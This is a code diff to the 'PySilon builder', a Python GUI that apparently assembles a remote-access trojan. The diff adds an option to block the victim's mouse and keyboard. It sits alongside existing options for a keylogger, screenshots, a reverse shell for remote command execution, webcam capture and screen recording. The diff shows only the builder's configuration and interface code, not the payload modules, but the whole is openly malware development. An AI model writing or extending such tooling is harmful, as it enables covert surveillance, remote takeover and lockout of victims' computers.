@@ -24,7 +24,8 @@ filenames = {
     'process': 'process.py',
     'rev_shl': 'reverse_shell.py',
     'webcam_': 'webcam.py',
-    'scrnrec': 'screenrec.py'
+    'scrnrec': 'screenrec.py',
+    'inputbl': 'block_input.py'
 }
 
 default_modules = [
@@ -81,6 +82,7 @@ def load_configuration(is_custom):
     cbvar_reverse_shell.set(config['FUNCTIONALITY']['rev_shl'])
     cbvar_webcam.set(config['FUNCTIONALITY']['webcam_'])
     cbvar_scrnrec.set(config['FUNCTIONALITY']['scrnrec'])
+    cbvar_inputbl.set(config['FUNCTIONALITY']['inputbl'])
 
 def reset_configuration():
     server_id.delete(0, END)
@@ -105,6 +107,7 @@ def reset_configuration():
     cbvar_reverse_shell.set(True)
     cbvar_webcam.set(True)
     cbvar_scrnrec.set(True)
+    cbvar_inputbl.set(True)
     cbvar_disclaimer.set(False)
 
     change_icon('resources/icons/icon.ico')
@@ -145,6 +148,7 @@ def save_configuration():
     config['FUNCTIONALITY']['rev_shl'] = str(cbvar_reverse_shell.get())
     config['FUNCTIONALITY']['webcam_'] = str(cbvar_webcam.get())
     config['FUNCTIONALITY']['scrnrec'] = str(cbvar_scrnrec.get())
+    config['FUNCTIONALITY']['inputbl'] = str(cbvar_inputbl.get())
 
     with open(config_path, 'w') as configfile:
         config.write(configfile)
@@ -260,7 +264,7 @@ if len(sys.argv) > 1:
         cli = 'soon' # CLI mode will be added soon...
 else:
     root = Tk()
-    root.geometry('700x600')
+    root.geometry('700x620')
     root.resizable(True, True)
     root.iconbitmap('resources/icons/icon.ico')
     root.title('PySilon builder')
@@ -336,6 +340,7 @@ else:
     cbvar_reverse_shell = BooleanVar(value=True)
     cbvar_webcam = BooleanVar(value=True)
     cbvar_scrnrec = BooleanVar(value=True)
+    cbvar_inputbl = BooleanVar(value=True)
 
     cb_keylogger = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='keylogger', variable=cbvar_keylogger, command=config_modification, onvalue=True, offvalue=False)
     cb_screenshot = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='screenshots', variable=cbvar_screenshot, command=config_modification, onvalue=True, offvalue=False)
@@ -351,6 +356,7 @@ else:
     cb_reverse_shell = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='reverse shell (execute remote CMD commands)', variable=cbvar_reverse_shell, command=config_modification, onvalue=True, offvalue=False)
     cb_webcam = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='webcam images capturing', variable=cbvar_webcam, command=config_modification, onvalue=True, offvalue=False)
     cb_scrnrec = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='screen recording', variable=cbvar_scrnrec, command=config_modification, onvalue=True, offvalue=False)
+    cb_inputbl = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='block inputs (mouse & keyboard)', variable=cbvar_inputbl, command=config_modification, onvalue=True, offvalue=False)
 
     cb_keylogger.grid(row=3, column=2, sticky=W, padx=(30, 0))
     cb_screenshot.grid(row=4, column=2, sticky=W, padx=(30, 0))
@@ -365,7 +371,8 @@ else:
     cb_scrnrec.grid(row=13, column=2, sticky=W, padx=(30, 0))
     cb_processes.grid(row=14, column=2, sticky=W, padx=(30, 0))
     cb_reverse_shell.grid(row=15, column=2, sticky=W, padx=(30, 0))
-    cb_webcam.grid(row=16, column=2, sticky=W, padx=(30, 0), pady=(0, 30))
+    cb_inputbl.grid(row=16, column=2, sticky=W, padx=(30, 0))
+    cb_webcam.grid(row=17, column=2, sticky=W, padx=(30, 0), pady=(0, 30))
 
     bottom_buttons = Canvas(root, width=1, height=1, bd=0)
     cbvar_disclaimer = BooleanVar(value=False)
